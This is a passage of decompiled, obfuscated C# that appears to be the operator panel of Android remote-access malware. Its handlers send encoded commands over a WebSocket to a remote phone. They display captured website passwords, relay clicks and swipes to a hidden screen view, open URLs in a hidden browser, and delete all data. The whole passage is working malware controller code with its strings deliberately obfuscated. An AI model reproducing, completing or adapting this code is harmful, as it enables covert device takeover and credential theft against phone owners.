				mytitle.Text = BTConst.Browserstr + EXGuarder._29296233 + Btcli.name + EXGuarder._29296233 + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Browserstr + EXGuarder._29296233 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void refpasses_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._7373252C, EXGuarder._345E4908);
		dictionary.Add(EXGuarder._046A741A, EXGuarder._094D320C);
		dictionary.Add(EXGuarder._39156864, EXGuarder._0B274B58);
		dictionary.Add(EXGuarder._2B357102, EXGuarder._092C4963);
		dictionary.Add(EXGuarder._2D600974, EXGuarder._436E5C02);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void dellall_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.confirmstr, BTConst.deleallactstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._4E48293E) == DialogResult.OK)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._175D1438, EXGuarder._2E006544);
			dictionary.Add(EXGuarder._4A2E0A6D, EXGuarder._5D0A336F);
			dictionary.Add(EXGuarder._27273155, EXGuarder._301B5B78);
			dictionary.Add(EXGuarder._66346F42, EXGuarder._0B722113);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void combositespass_SelectedIndexChanged(object sender, EventArgs e)
	{
		string text = combositespass.Text;
		if (Operators.CompareString(text, EXGuarder._46140236, TextCompare: false) == 0)
		{
			passtextlog.Text = string.Join(EXGuarder._51414928, SiteData.Values);
		}
		else if (SiteData.ContainsKey(text))
		{
			passtextlog.Text = SiteData[text];
		}
		else
		{
			passtextlog.Text = EXGuarder._5C24190A;
		}
	}

	private void DrakeUITextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			string text = urlinputhiden.Text;
			e.SuppressKeyPress = true;
			if (codes.StrisEmpty(text))
			{
				BTAlerter.infos(EXGuarder._5B1D1664);
				return;
			}
			string text2 = Conversions.ToString(BTRegistry.GetValue(EXGuarder._0D465B28, EXGuarder._4F184334));
			string value = codes.ToBase64(text + EXGuarder._23286267 + text2);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._39455961, EXGuarder._03534665);
			dictionary.Add(EXGuarder._43405934, EXGuarder._0D38353A);
			dictionary.Add(EXGuarder._1D332268, value);
			dictionary.Add(EXGuarder._764D2A47, EXGuarder._2406763B);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		string value = codes.ToBase64(EXGuarder._23273F22);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._0E27520A, EXGuarder._43653D73);
		dictionary.Add(EXGuarder._33061F6B, EXGuarder._59325652);
		dictionary.Add(EXGuarder._63740448, value);
		dictionary.Add(EXGuarder._3E477060, EXGuarder._3753290A);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		string value = codes.ToBase64(EXGuarder._2B157242);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3F244227, EXGuarder._00674359);
		dictionary.Add(EXGuarder._086B2743, EXGuarder._1C683610);
		dictionary.Add(EXGuarder._33136660, value);
		dictionary.Add(EXGuarder._6F3F7317, EXGuarder._1C04413A);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		string value = codes.ToBase64(EXGuarder._71324016);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._6D056668, EXGuarder._251D4E07);
		dictionary.Add(EXGuarder._660D4C49, EXGuarder._633E5E73);
		dictionary.Add(EXGuarder._50360033, value);
		dictionary.Add(EXGuarder._2D503633, EXGuarder._4609213E);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void inputtext_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			string text = inputtext.Text;
			e.SuppressKeyPress = true;
			if (codes.StrisEmpty(text))
			{
				string value = codes.ToBase64(EXGuarder._0E3D2E45);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._1D3F2C40, EXGuarder._4A3B0345);
				dictionary.Add(EXGuarder._380D3347, EXGuarder._3E225179);
				dictionary.Add(EXGuarder._35280251, value);
				dictionary.Add(EXGuarder._3A053006, EXGuarder._1249753A);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			else
			{
				string value2 = codes.ToBase64(string.Format(EXGuarder._5F445E12, text));
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._1D3F2C40, EXGuarder._4A3B0345);
				dictionary.Add(EXGuarder._380D3347, EXGuarder._3E225179);
				dictionary.Add(EXGuarder._35280251, value2);
				dictionary.Add(EXGuarder._3A053006, EXGuarder._1249753A);
				Dictionary<string, object> chatData2 = dictionary;
				BTEngine.commands(chatData2, Btcli.mobid, Btcli.Serverins.WSClient);
				inputtext.Text = EXGuarder._19412226;
			}
		}
	}

	private void viewhidden_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			HB_trackPoints.Clear();
			HB_startX = e.X;
			HB_startY = e.Y;
			HB_trackPoints.Add(new Point(HB_startX, HB_startY));
			HB_isDown = true;
			HB_isClick = true;
		}
	}

	private void viewhidden_MouseMove(object sender, MouseEventArgs e)
	{
		if (!HB_isDown)
		{
			return;
		}
		checked
		{
			int num = Math.Abs(e.X - HB_startX);
			int num2 = Math.Abs(e.Y - HB_startY);
			if (num > 5 || num2 > 5)
			{
				HB_isClick = false;
				if (e.X > 0 && e.Y > 0)
				{
					HB_trackPoints.Add(new Point(e.X, e.Y));
				}
			}
		}
	}

	private void viewhidden_MouseUp(object sender, MouseEventArgs e)
	{
		HB_isDown = false;
		int num = viewhidden.Width;
		int num2 = viewhidden.Height;
		checked
		{
			if (HB_isClick)
			{
				int num3 = (int)Math.Round((double)HB_startX * (720.0 / (double)num));
				int num4 = (int)Math.Round((double)HB_startY * (1280.0 / (double)num2));
				string value = codes.ToBase64(string.Format(EXGuarder._440A123E, num3, num4));
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._401E6104, EXGuarder._1D2C4523);
				dictionary.Add(EXGuarder._3C6A0A55, EXGuarder._35491505);
				dictionary.Add(EXGuarder._5E38615B, value);
				dictionary.Add(EXGuarder._71226F02, EXGuarder._09675C21);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			else if (HB_trackPoints.Count > 0)
			{
				HB_trackPoints.Add(new Point(e.X, e.Y));
				List<Point> source = HB_trackPoints.Select([SpecialName] (Point p) => new Point((int)Math.Round((double)p.X * (720.0 / (double)num)), (int)Math.Round((double)p.Y * (1280.0 / (double)num2)))).ToList();
				string arg = string.Join(EXGuarder._78271F0E, source.Select([SpecialName] (Point p) => $"({p.X}, {p.Y})"));
				string value2 = codes.ToBase64(string.Format(EXGuarder._30451316, arg));
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._401E6104, EXGuarder._1D2C4523);
				dictionary.Add(EXGuarder._3C6A0A55, EXGuarder._35491505);
				dictionary.Add(EXGuarder._5E38615B, value2);
				dictionary.Add(EXGuarder._71226F02, EXGuarder._09675C21);
				Dictionary<string, object> chatData2 = dictionary;
				BTEngine.commands(chatData2, Btcli.mobid, Btcli.Serverins.WSClient);
			}
		}
	}

	private void stophdbbtn_Click(object sender, EventArgs e)
	{
		if (MyMsg.Show(BTConst.confirmstr, BTConst.stopaclosstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._324A6418) == DialogResult.OK)
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._4B23605D, EXGuarder._4E580F1C);
			dictionary.Add(EXGuarder._576E531A, EXGuarder._44096005);
			dictionary.Add(EXGuarder._0B383845, EXGuarder._6771552F);
			dictionary.Add(EXGuarder._40714272, EXGuarder._6771552F);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
	}

	private void selcthtmlbtn_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = EXGuarder._6E601B72;
		openFileDialog.Title = EXGuarder._6E1B5E28;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = openFileDialog.FileName;
			monitorinput.Text = fileName;
		}
	}

	private void clractlog_Click(object sender, EventArgs e)
	{
		passtextlog.Text = EXGuarder._6C175B58;
	}
}
